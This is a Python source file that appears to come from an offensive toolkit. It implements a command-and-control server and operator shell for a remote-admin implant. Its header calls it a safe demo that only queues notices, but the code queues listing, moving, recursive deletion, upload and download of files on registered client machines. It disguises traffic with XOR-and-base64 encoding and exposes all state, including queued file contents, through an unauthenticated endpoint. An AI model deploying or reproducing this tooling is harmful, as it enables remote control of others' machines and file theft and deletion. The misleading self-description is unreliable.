#!/usr/bin/env python3
# Author: @m8sec
# License: BSD 3-Clause
#
# Description:
# Run a local demo message server that tracks clients and queues notices for them.
#
# Info:
# This is a safe example for the taser.exp.radmin package. It supports client
# registration and message exchange, but it does not execute remote commands.
#
# Usage:
# python3 -m taser.exp.radmin.server --host 127.0.0.1 --port 8888

from __future__ import annotations

import argparse
import base64
import getpass
import json
import shlex
import shutil
import sys
import threading
from cmd import Cmd
from collections import defaultdict
from dataclasses import dataclass, field
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Optional
from urllib.parse import parse_qs, urlparse

from taser import BANNER
from taser.logx import setup_cli_logger


def _xor_bytes(data: bytes, key: bytes) -> bytes:
    if not key:
        raise ValueError("key is required")
    return bytes(byte ^ key[index % len(key)] for index, byte in enumerate(data))


def _encode_bytes(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def _decode_bytes(data: str) -> bytes:
    return base64.b64decode(data.encode("ascii"))


def _encrypt_payload(payload: dict, key: str) -> bytes:
    raw = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    return base64.b64encode(_xor_bytes(raw, key.encode("utf-8")))


def _decrypt_payload(payload: bytes, key: str) -> dict:
    raw = _xor_bytes(base64.b64decode(payload), key.encode("utf-8"))
    return json.loads(raw.decode("utf-8"))


@dataclass
class RemoteAdminStore:
    clients: dict = field(default_factory=dict)
    messages: dict = field(default_factory=lambda: defaultdict(list))
    commands: dict = field(default_factory=lambda: defaultdict(list))
    results: dict = field(default_factory=lambda: defaultdict(list))
    acknowledgements: dict = field(default_factory=lambda: defaultdict(list))
    _next_command_id: int = 1

    def register(self, name, metadata=None, source_ip=""):
        clean_name = str(name).strip()
        if not clean_name:
            raise ValueError("name is required")
        clean_metadata = dict(metadata or {})
        client_id = "{}@{}".format(clean_name, source_ip or "unknown")
        is_new = clean_name not in self.clients
        self.clients[clean_name] = {"client_id": client_id, "meta": clean_metadata}
        if is_new:
            self.messages[clean_name].append("welcome {}".format(clean_name))
        return client_id

    def pop_messages(self, name):
        clean_name = str(name).strip()
        if not clean_name:
            raise ValueError("name is required")
        messages = list(self.messages[clean_name])
        self.messages[clean_name].clear()
        return messages

    def queue_command(self, name, command):
        clean_name = str(name).strip()
        if not clean_name:
            raise ValueError("name is required")
        if clean_name not in self.clients:
            raise KeyError("unknown client: {}".format(clean_name))
        command_payload = dict(command or {})
        action = str(command_payload.get("action", "")).strip()
        if not action:
            raise ValueError("command action is required")
        command_payload["id"] = self._next_command_id
        self._next_command_id += 1
        self.commands[clean_name].append(command_payload)
        return command_payload

    def pop_commands(self, name):
        clean_name = str(name).strip()
        if not clean_name:
            raise ValueError("name is required")
        commands = list(self.commands[clean_name])
        self.commands[clean_name].clear()
        return commands

    def store_result(self, name, result):
        clean_name = str(name).strip()
        if not clean_name:
            raise ValueError("name is required")
        self.results[clean_name].append(dict(result or {}))

    def pop_results(self, name=None):
        if name is None:
            data = {client: list(results) for client, results in self.results.items() if results}
            for client in data:
                self.results[client].clear()
            return data
        clean_name = str(name).strip()
        if not clean_name:
            raise ValueError("name is required")
        results = list(self.results[clean_name])
        self.results[clean_name].clear()
        return results

    def store_acknowledgement(self, name, message):
        clean_name = str(name).strip()
        clean_message = str(message).strip()
        if not clean_name or not clean_message:
            raise ValueError("name and message are required")
        self.acknowledgements[clean_name].append(clean_message)

    def snapshot(self):
        return {
            "clients": self.clients,
            "messages": {name: list(messages) for name, messages in self.messages.items()},
            "commands": {name: list(commands) for name, commands in self.commands.items()},
            "results": {name: list(results) for name, results in self.results.items()},
            "acks": {name: list(messages) for name, messages in self.acknowledgements.items()},
        }


def create_remote_admin_handler(store: RemoteAdminStore, key: str, logger=None):
    log = logger or (lambda _message: None)

    class RemoteAdminHandler(BaseHTTPRequestHandler):
        server_version = "TaserRemoteAdmin/1.0"

        def _send_json(self, status, payload):
            data = _encrypt_payload(payload, key)
            self.send_response(status)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def _read_json(self):
            length = int(self.headers.get("Content-Length", "0"))
            raw = self.rfile.read(length) if length else b""
            if not raw:
                return {}
            return _decrypt_payload(raw, key)

        def _client_ip(self):
            return self.headers.get("X-Forwarded-For", self.client_address[0]).split(",")[0].strip()

        def do_POST(self):  # noqa: N802
            if self.path == "/register":
                try:
                    payload = self._read_json()
                except Exception as exc:
                    self._send_json(HTTPStatus.BAD_REQUEST, {"error": "invalid encrypted payload: {}".format(exc)})
                    return
                try:
                    client_id = store.register(payload.get("name", ""), metadata=payload, source_ip=self._client_ip())
                except ValueError as exc:
                    self._send_json(HTTPStatus.BAD_REQUEST, {"error": str(exc)})
                    return
                log("registered {}".format(client_id))
                self._send_json(HTTPStatus.OK, {"client_id": client_id})
                return

            if self.path == "/messages":
                try:
                    payload = self._read_json()
                except Exception as exc:
                    self._send_json(HTTPStatus.BAD_REQUEST, {"error": "invalid encrypted payload: {}".format(exc)})
                    return
                try:
                    store.store_acknowledgement(payload.get("name", ""), payload.get("message", ""))
                except ValueError as exc:
                    self._send_json(HTTPStatus.BAD_REQUEST, {"error": str(exc)})
                    return
                self._send_json(HTTPStatus.OK, {"status": "stored"})
                return

            if self.path == "/messages/pull":
                try:
                    payload = self._read_json()
                except Exception as exc:
                    self._send_json(HTTPStatus.BAD_REQUEST, {"error": "invalid encrypted payload: {}".format(exc)})
                    return
                try:
                    messages = store.pop_messages(payload.get("name", ""))
                except ValueError as exc:
                    self._send_json(HTTPStatus.BAD_REQUEST, {"error": str(exc)})
                    return
                self._send_json(HTTPStatus.OK, {"messages": messages})
                return

            if self.path == "/results":
                try:
                    payload = self._read_json()
                except Exception as exc:
                    self._send_json(HTTPStatus.BAD_REQUEST, {"error": "invalid encrypted payload: {}".format(exc)})
                    return
                try:
                    store.store_result(payload.get("name", ""), payload.get("result", {}))
                except ValueError as exc:
                    self._send_json(HTTPStatus.BAD_REQUEST, {"error": str(exc)})
                    return
                log("result {}: {}".format(payload.get("name", "").strip(), payload.get("result", {}).get("action", "")))
                self._send_json(HTTPStatus.OK, {"status": "stored"})
                return

            if self.path == "/commands":
                try:
                    payload = self._read_json()
                except Exception as exc:
                    self._send_json(HTTPStatus.BAD_REQUEST, {"error": "invalid encrypted payload: {}".format(exc)})
                    return
                try:
                    command = store.queue_command(payload.get("name", ""), payload.get("command", {}))
                except (ValueError, KeyError) as exc:
                    self._send_json(HTTPStatus.BAD_REQUEST, {"error": str(exc)})
                    return
                self._send_json(HTTPStatus.OK, {"command": command})
                return

            if self.path == "/commands/pull":
                try:
                    payload = self._read_json()
                except Exception as exc:
                    self._send_json(HTTPStatus.BAD_REQUEST, {"error": "invalid encrypted payload: {}".format(exc)})
                    return
                try:
                    commands = store.pop_commands(payload.get("name", ""))
                except ValueError as exc:
                    self._send_json(HTTPStatus.BAD_REQUEST, {"error": str(exc)})
                    return
                self._send_json(HTTPStatus.OK, {"commands": commands})
                return

            self._send_json(HTTPStatus.NOT_FOUND, {"error": "not found"})

        def do_GET(self):  # noqa: N802
            parsed = urlparse(self.path)
            if parsed.path == "/clients":
                data = json.dumps(store.snapshot()).encode("utf-8")
                self.send_response(HTTPStatus.OK)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
                return

            data = json.dumps({"error": "not found"}).encode("utf-8")
            self.send_response(HTTPStatus.NOT_FOUND)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def log_message(self, format, *args):  # noqa: A003
            return

    return RemoteAdminHandler


class RemoteAdminDemoServer:
    def __init__(self, host="127.0.0.1", port=8888, key="", store=None, logger=None):
        self.store = store or RemoteAdminStore()
        self.logger = logger or (lambda _message: None)
        self._server = ThreadingHTTPServer(
            (host, int(port)),
            create_remote_admin_handler(self.store, key, self.logger),
        )

    @property
    def server_address(self):
        return self._server.server_address

    def serve_forever(self):
        self._server.serve_forever()

    def shutdown(self):
        self._server.shutdown()


class RemoteAdminShell(Cmd):
    prompt = "(radmin) > "

    def __init__(self, store, logger=None, download_dir="downloads"):
        super().__init__()
        self.store = store
        self.logger = logger or print
        self.download_dir = Path(download_dir).expanduser().resolve()
        self.download_dir.mkdir(parents=True, exist_ok=True)

    def _parse(self, line):
        return shlex.split(line)

    def _ensure_client(self, name):
        if name not in self.store.clients:
            raise ValueError("unknown client: {}".format(name))

    def _queue(self, name, command):
        self._ensure_client(name)
        queued = self.store.queue_command(name, command)
        self.logger("queued {} for {}".format(queued["action"], name))
        return queued

    def do_clients(self, _line):
        if not self.store.clients:
            self.logger("No clients registered.")
            return
        for name, info in sorted(self.store.clients.items()):
            self.logger("{} - {}".format(name, info["client_id"]))

    def do_results(self, line):
        parts = self._parse(line)
        if parts:
            results = {parts[0]: self.store.pop_results(parts[0])}
        else:
            results = self.store.pop_results()
        if not results:
            self.logger("No results available.")
            return
        for name, items in results.items():
            for item in items:
                self._render_result(name, item)

    def _render_result(self, name, item):
        if item.get("action") == "download" and item.get("ok") and item.get("content_b64"):
            save_to = item.get("save_to") or Path(item.get("path", "download.bin")).name
            destination = self.download_dir / save_to
            destination.parent.mkdir(parents=True, exist_ok=True)
            destination.write_bytes(_decode_bytes(item["content_b64"]))
            self.logger("{} download saved to {}".format(name, destination))
            item = dict(item)
            item.pop("content_b64", None)
        self.logger("{} -> {}".format(name, json.dumps(item, sort_keys=True)))

    def do_queue(self, line):
        parts = self._parse(line)
        if len(parts) < 2:
            self.logger("usage: queue <client> <json-command>")
            return
        name = parts[0]
        command = json.loads(" ".join(parts[1:]))
        self._queue(name, command)

    def do_ls(self, line):
        parts = self._parse(line)
        if not parts:
            self.logger("usage: ls <client> [path]")
            return
        self._queue(parts[0], {"action": "ls", "path": parts[1] if len(parts) > 1 else "."})

    def do_move(self, line):
        parts = self._parse(line)
        if len(parts) != 3:
            self.logger("usage: move <client> <src> <dst>")
            return
        self._queue(parts[0], {"action": "move", "src": parts[1], "dst": parts[2]})

    def do_rm(self, line):
        parts = self._parse(line)
        if len(parts) < 2:
            self.logger("usage: rm <client> <path> [--recursive]")
            return
        self._queue(
            parts[0],
            {"action": "rm", "path": parts[1], "recursive": "--recursive" in parts[2:]},
        )

    def do_upload(self, line):
        parts = self._parse(line)
        if len(parts) != 3:
            self.logger("usage: upload <client> <local-source> <remote-path>")
            return
        local_source = Path(parts[1]).expanduser().resolve()
        if not local_source.exists() or not local_source.is_file():
            self.logger("local file not found")
            return
        self._queue(
            parts[0],
            {
                "action": "upload",
                "path": parts[2],
                "content_b64": _encode_bytes(local_source.read_bytes()),
            },
        )

    def do_download(self, line):
        parts = self._parse(line)
        if len(parts) < 2:
            self.logger("usage: download <client> <remote-path> [local-name]")
            return
        save_to = parts[2] if len(parts) > 2 else Path(parts[1]).name
        self._queue(parts[0], {"action": "download", "path": parts[1], "save_to": save_to})

    def do_exit(self, _line):
        return True

    def do_EOF(self, _line):  # noqa: N802
        return True


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="\t\t{}".format(sys.argv[0]),
        formatter_class=argparse.RawTextHelpFormatter,
        usage=argparse.SUPPRESS,
    )
    parser.add_argument("--host", default="127.0.0.1", help="Bind host")
    parser.add_argument("--port", type=int, default=8888, help="Bind port")
    parser.add_argument("--downloads", default="downloads", help="Directory used for downloaded files")
    parser.add_argument("--key", default="", help="XOR key for application-layer payload encryption")
    return parser


def cli(argv: Optional[list[str]] = None) -> None:
    args = build_parser().parse_args(argv)
    cli_logger = setup_cli_logger(spacer=[4, 30])
    cli_logger.info(BANNER)
    key = args.key or getpass.getpass("radmin key: ")
    if not key:
        cli_logger.warning("Failed to start server: key is required", bullet='[!] ', fg='yellow')
        raise SystemExit(1)
    store = RemoteAdminStore()

    def log_message(message):
        cli_logger.write(message)

    try:
        server = RemoteAdminDemoServer(args.host, args.port, key=key, store=store, logger=log_message)
    except OSError as exc:
        cli_logger.warning("Failed to start server: {}".format(exc), bullet='[!] ', fg='yellow')
        raise SystemExit(1)

    cli_logger.info("Listening on http://{}:{}".format(*server.server_address))
    cli_logger.info("Client state: GET /clients")
    cli_logger.info("Commands: clients, results, ls, move, rm, upload, download, queue, exit")
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        RemoteAdminShell(store, logger=log_message, download_dir=args.downloads).cmdloop()
    except KeyboardInterrupt:
        cli_logger.warning("Key event detected, closing...", bullet='[!] ', fg='yellow')
    finally:
        server.shutdown()
    raise SystemExit(0)


if __name__ == "__main__":
    cli()
